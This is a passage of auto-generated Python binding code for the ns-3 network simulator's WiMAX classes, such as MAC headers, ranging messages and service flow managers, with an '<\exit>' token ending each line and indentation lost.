def register_Ns3LogNormalVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::LogNormalVariable const &', 'arg0')])<\exit>
cls.add_constructor([param('double', 'mu'), param('double', 'sigma')])<\exit>
return<\exit>
def register_Ns3MacHeaderType_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::MacHeaderType const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('uint8_t', 'type')])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetType',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetType',<\exit>
'void',<\exit>
[param('uint8_t', 'type')])<\exit>
return<\exit>
def register_Ns3ManagementMessageType_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ManagementMessageType const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('uint8_t', 'type')])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetType',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetType',<\exit>
'void',<\exit>
[param('uint8_t', 'type')])<\exit>
return<\exit>
def register_Ns3NormalVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::NormalVariable const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('double', 'm'), param('double', 'v')])<\exit>
cls.add_constructor([param('double', 'm'), param('double', 'v'), param('double', 'b')])<\exit>
return<\exit>
def register_Ns3Object_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_method('AggregateObject',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::Object >', 'other')])<\exit>
cls.add_method('Dispose',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('GetAggregateIterator',<\exit>
'ns3::Object::AggregateIterator',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Start',<\exit>
'void',<\exit>
[])<\exit>
cls.add_constructor([param('ns3::Object const &', 'o')],<\exit>
visibility='protected')<\exit>
cls.add_method('DoDispose',<\exit>
'void',<\exit>
[],<\exit>
visibility='protected', is_virtual=True)<\exit>
cls.add_method('DoStart',<\exit>
'void',<\exit>
[],<\exit>
visibility='protected', is_virtual=True)<\exit>
cls.add_method('NotifyNewAggregate',<\exit>
'void',<\exit>
[],<\exit>
visibility='protected', is_virtual=True)<\exit>
return<\exit>
def register_Ns3ObjectAggregateIterator_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::Object::AggregateIterator const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('HasNext',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Next',<\exit>
'ns3::Ptr< ns3::Object const >',<\exit>
[])<\exit>
return<\exit>
def register_Ns3OfdmDownlinkFramePrefix_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::OfdmDownlinkFramePrefix const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('AddDlFramePrefixElement',<\exit>
'void',<\exit>
[param('ns3::DlFramePrefixIe', 'dlFramePrefixElement')])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetBaseStationId',<\exit>
'ns3::Mac48Address',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetConfigurationChangeCount',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDlFramePrefixElements',<\exit>
'std::vector< ns3::DlFramePrefixIe >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFrameNumber',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetHcs',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetBaseStationId',<\exit>
'void',<\exit>
[param('ns3::Mac48Address', 'baseStationId')])<\exit>
cls.add_method('SetConfigurationChangeCount',<\exit>
'void',<\exit>
[param('uint8_t', 'configurationChangeCount')])<\exit>
cls.add_method('SetFrameNumber',<\exit>
'void',<\exit>
[param('uint32_t', 'frameNumber')])<\exit>
cls.add_method('SetHcs',<\exit>
'void',<\exit>
[param('uint8_t', 'hcs')])<\exit>
return<\exit>
def register_Ns3OfdmSendParams_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::OfdmSendParams const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::PacketBurst >', 'burst'), param('uint8_t', 'modulationType'), param('uint8_t', 'direction')])<\exit>
cls.add_method('GetBurst',<\exit>
'ns3::Ptr< ns3::PacketBurst >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDirection',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetModulationType',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3OfdmUcdChannelEncodings_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::OfdmUcdChannelEncodings const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetSbchnlFocContCodes',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSbchnlReqRegionFullParams',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSize',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetSbchnlFocContCodes',<\exit>
'void',<\exit>
[param('uint8_t', 'sbchnlFocContCodes')])<\exit>
cls.add_method('SetSbchnlReqRegionFullParams',<\exit>
'void',<\exit>
[param('uint8_t', 'sbchnlReqRegionFullParams')])<\exit>
cls.add_method('DoRead',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
visibility='private', is_virtual=True)<\exit>
cls.add_method('DoWrite',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3PacketBurst_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::PacketBurst const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('AddPacket',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet')])<\exit>
cls.add_method('Begin',<\exit>
'std::_List_const_iterator< ns3::Ptr< ns3::Packet > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::PacketBurst >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('End',<\exit>
'std::_List_const_iterator< ns3::Ptr< ns3::Packet > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNPackets',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPackets',<\exit>
'std::list< ns3::Ptr< ns3::Packet > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('DoDispose',<\exit>
'void',<\exit>
[],<\exit>
visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3ParetoVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ParetoVariable const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('double', 'm')])<\exit>
cls.add_constructor([param('double', 'm'), param('double', 's')])<\exit>
cls.add_constructor([param('double', 'm'), param('double', 's'), param('double', 'b')])<\exit>
cls.add_constructor([param('std::pair< double, double >', 'params')])<\exit>
cls.add_constructor([param('std::pair< double, double >', 'params'), param('double', 'b')])<\exit>
return<\exit>
def register_Ns3PcapFileWrapper_methods(root_module, cls):<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Fail',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Eof',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Clear',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('Open',<\exit>
'void',<\exit>
[param('std::string const &', 'filename'), param('std::_Ios_Openmode', 'mode')])<\exit>
cls.add_method('Close',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('Init',<\exit>
'void',<\exit>
[param('uint32_t', 'dataLinkType'), param('uint32_t', 'snapLen', default_value='std::numeric_limits<unsigned int>::max()'), param('int32_t', 'tzCorrection', default_value='ns3::PcapFile::ZONE_DEFAULT')])<\exit>
cls.add_method('Write',<\exit>
'void',<\exit>
[param('ns3::Time', 't'), param('ns3::Ptr< ns3::Packet const >', 'p')])<\exit>
cls.add_method('Write',<\exit>
'void',<\exit>
[param('ns3::Time', 't'), param('ns3::Header &', 'header'), param('ns3::Ptr< ns3::Packet const >', 'p')])<\exit>
cls.add_method('Write',<\exit>
'void',<\exit>
[param('ns3::Time', 't'), param('uint8_t const *', 'buffer'), param('uint32_t', 'length')])<\exit>
cls.add_method('GetMagic',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetVersionMajor',<\exit>
'uint16_t',<\exit>
[])<\exit>
cls.add_method('GetVersionMinor',<\exit>
'uint16_t',<\exit>
[])<\exit>
cls.add_method('GetTimeZoneOffset',<\exit>
'int32_t',<\exit>
[])<\exit>
cls.add_method('GetSigFigs',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetSnapLen',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetDataLinkType',<\exit>
'uint32_t',<\exit>
[])<\exit>
return<\exit>
def register_Ns3PortRangeTlvValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::PortRangeTlvValue const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Add',<\exit>
'void',<\exit>
[param('uint16_t', 'portLow'), param('uint16_t', 'portHigh')])<\exit>
cls.add_method('Begin',<\exit>
'__gnu_cxx::__normal_iterator< ns3::PortRangeTlvValue::PortRange const *, std::vector< ns3::PortRangeTlvValue::PortRange > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Copy',<\exit>
'ns3::PortRangeTlvValue *',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],<\exit>
is_virtual=True)<\exit>
cls.add_method('End',<\exit>
'__gnu_cxx::__normal_iterator< ns3::PortRangeTlvValue::PortRange const *, std::vector< ns3::PortRangeTlvValue::PortRange > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3PortRangeTlvValuePortRange_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::PortRangeTlvValue::PortRange const &', 'arg0')])<\exit>
cls.add_instance_attribute('PortHigh', 'uint16_t', is_const=False)<\exit>
cls.add_instance_attribute('PortLow', 'uint16_t', is_const=False)<\exit>
return<\exit>
def register_Ns3PriorityUlJob_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::PriorityUlJob const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetPriority',<\exit>
'int',<\exit>
[])<\exit>
cls.add_method('GetUlJob',<\exit>
'ns3::Ptr< ns3::UlJob >',<\exit>
[])<\exit>
cls.add_method('SetPriority',<\exit>
'void',<\exit>
[param('int', 'priority')])<\exit>
cls.add_method('SetUlJob',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::UlJob >', 'job')])<\exit>
return<\exit>
def register_Ns3PropagationLossModel_methods(root_module, cls):<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_method('SetNext',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::PropagationLossModel >', 'next')])<\exit>
cls.add_method('CalcRxPower',<\exit>
'double',<\exit>
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],<\exit>
is_const=True)<\exit>
cls.add_method('DoCalcRxPower',<\exit>
'double',<\exit>
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3ProtocolTlvValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ProtocolTlvValue const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Add',<\exit>
'void',<\exit>
[param('uint8_t', 'protiocol')])<\exit>
cls.add_method('Begin',<\exit>
'__gnu_cxx::__normal_iterator< unsigned char const *, std::vector< unsigned char > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Copy',<\exit>
'ns3::ProtocolTlvValue *',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],<\exit>
is_virtual=True)<\exit>
cls.add_method('End',<\exit>
'__gnu_cxx::__normal_iterator< unsigned char const *, std::vector< unsigned char > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3RandomPropagationLossModel_methods(root_module, cls):<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_method('DoCalcRxPower',<\exit>
'double',<\exit>
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3RangePropagationLossModel_methods(root_module, cls):<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_method('DoCalcRxPower',<\exit>
'double',<\exit>
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3RngReq_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::RngReq const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetMacAddress',<\exit>
'ns3::Mac48Address',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRangingAnomalies',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetReqDlBurstProfile',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('PrintDebug',<\exit>
'void',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetMacAddress',<\exit>
'void',<\exit>
[param('ns3::Mac48Address', 'macAddress')])<\exit>
cls.add_method('SetRangingAnomalies',<\exit>
'void',<\exit>
[param('uint8_t', 'rangingAnomalies')])<\exit>
cls.add_method('SetReqDlBurstProfile',<\exit>
'void',<\exit>
[param('uint8_t', 'reqDlBurstProfile')])<\exit>
return<\exit>
def register_Ns3RngRsp_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::RngRsp const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetAasBdcastPermission',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetBasicCid',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDlFreqOverride',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDlOperBurstProfile',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFrameNumber',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInitRangOppNumber',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetMacAddress',<\exit>
'ns3::Mac48Address',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetOffsetFreqAdjust',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPowerLevelAdjust',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPrimaryCid',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRangStatus',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRangSubchnl',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTimingAdjust',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetUlChnlIdOverride',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetAasBdcastPermission',<\exit>
'void',<\exit>
[param('uint8_t', 'aasBdcastPermission')])<\exit>
cls.add_method('SetBasicCid',<\exit>
'void',<\exit>
[param('ns3::Cid', 'basicCid')])<\exit>
cls.add_method('SetDlFreqOverride',<\exit>
'void',<\exit>
[param('uint32_t', 'dlFreqOverride')])<\exit>
cls.add_method('SetDlOperBurstProfile',<\exit>
'void',<\exit>
[param('uint16_t', 'dlOperBurstProfile')])<\exit>
cls.add_method('SetFrameNumber',<\exit>
'void',<\exit>
[param('uint32_t', 'frameNumber')])<\exit>
cls.add_method('SetInitRangOppNumber',<\exit>
'void',<\exit>
[param('uint8_t', 'initRangOppNumber')])<\exit>
cls.add_method('SetMacAddress',<\exit>
'void',<\exit>
[param('ns3::Mac48Address', 'macAddress')])<\exit>
cls.add_method('SetOffsetFreqAdjust',<\exit>
'void',<\exit>
[param('uint32_t', 'offsetFreqAdjust')])<\exit>
cls.add_method('SetPowerLevelAdjust',<\exit>
'void',<\exit>
[param('uint8_t', 'powerLevelAdjust')])<\exit>
cls.add_method('SetPrimaryCid',<\exit>
'void',<\exit>
[param('ns3::Cid', 'primaryCid')])<\exit>
cls.add_method('SetRangStatus',<\exit>
'void',<\exit>
[param('uint8_t', 'rangStatus')])<\exit>
cls.add_method('SetRangSubchnl',<\exit>
'void',<\exit>
[param('uint8_t', 'rangSubchnl')])<\exit>
cls.add_method('SetTimingAdjust',<\exit>
'void',<\exit>
[param('uint32_t', 'timingAdjust')])<\exit>
cls.add_method('SetUlChnlIdOverride',<\exit>
'void',<\exit>
[param('uint8_t', 'ulChnlIdOverride')])<\exit>
return<\exit>
def register_Ns3SSManager_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::SSManager const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('CreateSSRecord',<\exit>
'ns3::SSRecord *',<\exit>
[param('ns3::Mac48Address const &', 'macAddress')])<\exit>
cls.add_method('DeleteSSRecord',<\exit>
'void',<\exit>
[param('ns3::Cid', 'cid')])<\exit>
cls.add_method('GetMacAddress',<\exit>
'ns3::Mac48Address',<\exit>
[param('ns3::Cid', 'cid')],<\exit>
is_const=True)<\exit>
cls.add_method('GetNRegisteredSSs',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNSSs',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSSRecord',<\exit>
'ns3::SSRecord *',<\exit>
[param('ns3::Mac48Address const &', 'macAddress')],<\exit>
is_const=True)<\exit>
cls.add_method('GetSSRecord',<\exit>
'ns3::SSRecord *',<\exit>
[param('ns3::Cid', 'cid')],<\exit>
is_const=True)<\exit>
cls.add_method('GetSSRecords',<\exit>
'std::vector< ns3::SSRecord * > *',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('IsInRecord',<\exit>
'bool',<\exit>
[param('ns3::Mac48Address const &', 'macAddress')],<\exit>
is_const=True)<\exit>
cls.add_method('IsRegistered',<\exit>
'bool',<\exit>
[param('ns3::Mac48Address const &', 'macAddress')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3ServiceFlowManager_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ServiceFlowManager const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('AddServiceFlow',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow')])<\exit>
cls.add_method('AreServiceFlowsAllocated',<\exit>
'bool',<\exit>
[])<\exit>
cls.add_method('AreServiceFlowsAllocated',<\exit>
'bool',<\exit>
[param('std::vector< ns3::ServiceFlow * > *', 'serviceFlows')])<\exit>
cls.add_method('AreServiceFlowsAllocated',<\exit>
'bool',<\exit>
[param('std::vector< ns3::ServiceFlow * >', 'serviceFlows')])<\exit>
cls.add_method('DoClassify',<\exit>
'ns3::ServiceFlow *',<\exit>
[param('ns3::Ipv4Address', 'SrcAddress'), param('ns3::Ipv4Address', 'DstAddress'), param('uint16_t', 'SrcPort'), param('uint16_t', 'DstPort'), param('uint8_t', 'Proto'), param('ns3::ServiceFlow::Direction', 'dir')],<\exit>
is_const=True)<\exit>
cls.add_method('DoDispose',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetNextServiceFlowToAllocate',<\exit>
'ns3::ServiceFlow *',<\exit>
[])<\exit>
cls.add_method('GetNrServiceFlows',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetServiceFlow',<\exit>
'ns3::ServiceFlow *',<\exit>
[param('uint32_t', 'sfid')],<\exit>
is_const=True)<\exit>
cls.add_method('GetServiceFlow',<\exit>
'ns3::ServiceFlow *',<\exit>
[param('ns3::Cid', 'cid')],<\exit>
is_const=True)<\exit>
cls.add_method('GetServiceFlows',<\exit>
'std::vector< ns3::ServiceFlow * >',<\exit>
[param('ns3::ServiceFlow::SchedulingType', 'schedulingType')],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3SfVectorTlvValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::SfVectorTlvValue const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Copy',<\exit>
'ns3::SfVectorTlvValue *',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],<\exit>
is_virtual=True)<\exit>
return<\exit>
def register_Ns3SimpleRefCount__Ns3AttributeAccessor_Ns3Empty_Ns3DefaultDeleter__lt__ns3AttributeAccessor__gt___methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::SimpleRefCount< ns3::AttributeAccessor, ns3::empty, ns3::DefaultDeleter< ns3::AttributeAccessor > > const &', 'o')])<\exit>
cls.add_method('Cleanup',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3SimpleRefCount__Ns3AttributeChecker_Ns3Empty_Ns3DefaultDeleter__lt__ns3AttributeChecker__gt___methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::SimpleRefCount< ns3::AttributeChecker, ns3::empty, ns3::DefaultDeleter< ns3::AttributeChecker > > const &', 'o')])<\exit>
cls.add_method('Cleanup',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3SimpleRefCount__Ns3AttributeValue_Ns3Empty_Ns3DefaultDeleter__lt__ns3AttributeValue__gt___methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::SimpleRefCount< ns3::AttributeValue, ns3::empty, ns3::DefaultDeleter< ns3::AttributeValue > > const &', 'o')])<\exit>
cls.add_method('Cleanup',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3SimpleRefCount__Ns3CallbackImplBase_Ns3Empty_Ns3DefaultDeleter__lt__ns3CallbackImplBase__gt___methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
